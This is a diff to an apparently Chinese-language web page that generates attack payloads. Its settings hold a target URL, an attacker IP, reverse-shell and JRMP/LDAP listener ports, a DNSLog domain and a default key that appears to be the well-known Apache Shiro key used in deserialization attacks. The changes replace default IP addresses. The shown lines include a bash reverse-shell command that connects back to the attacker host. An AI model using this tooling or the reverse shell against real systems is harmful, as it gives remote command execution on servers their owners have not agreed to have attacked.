@@ -127,8 +127,8 @@ ul.tight{margin:6px 0;padding-left:20px;} ul.tight li{margin:2px 0;}
 <div class="glob">
   <div style="font-weight:600;margin-bottom:9px;font-size:13.5px;">全局参数 <span class="muted small">（填一次，下面所有 Payload 自动替换）</span></div>
   <div class="row">
-    <div class="f"><label>目标 URL</label><input type="text" id="g_target" value="http://192.168.184.162:8080"></div>
-    <div class="f"><label>攻击机 IP (LHOST)</label><input type="text" id="g_lhost" value="192.168.184.132"></div>
+    <div class="f"><label>目标 URL</label><input type="text" id="g_target" value="http://192.168.1.10:8080"></div>
+    <div class="f"><label>攻击机 IP (LHOST)</label><input type="text" id="g_lhost" value="192.168.1.100"></div>
     <div class="f"><label>反弹 Shell 端口</label><input type="text" id="g_lport" value="9988"></div>
     <div class="f"><label>JRMP / LDAP 监听端口</label><input type="text" id="g_jrmp" value="10099"></div>
     <div class="f"><label>DNSLog 域名</label><input type="text" id="g_dns" value="abc123.dnslog.cn"></div>
@@ -215,7 +215,7 @@ ul.tight{margin:6px 0;padding-left:20px;} ul.tight li{margin:2px 0;}
   <div class="card">
     <h2>编码工具</h2>
     <div class="row" style="display:flex;gap:10px;flex-wrap:wrap;">
-      <div class="f" style="flex:1 1 200px;"><label>原文本</label><input type="text" id="encIn" value="bash -i >& /dev/tcp/192.168.184.132/9988 0>&1"></div>
+      <div class="f" style="flex:1 1 200px;"><label>原文本</label><input type="text" id="encIn" value="bash -i >& /dev/tcp/192.168.1.100/9988 0>&1"></div>
     </div>
     <div class="btns">
       <button class="btn" onclick="doEnc('b64')">Base64 编码</button>
@@ -795,7 +795,7 @@ const TOOLS = {
    逻辑
    ============================================================ */
 const sel = {fp:new Set(), ver:new Set(), pay:new Set(), flow:new Set(), tool:new Set()};
-const DEF = {target:'http://192.168.184.162:8080',lhost:'192.168.184.132',lport:'9988',jrmp:'10099',
+const DEF = {target:'http://192.168.1.10:8080',lhost:'192.168.1.100',lport:'9988',jrmp:'10099',
              dns:'abc123.dnslog.cn',cmd:'id',key:'kPH+bIxk5D2deZiIxcaaaA=='};
 
 function ctx(){
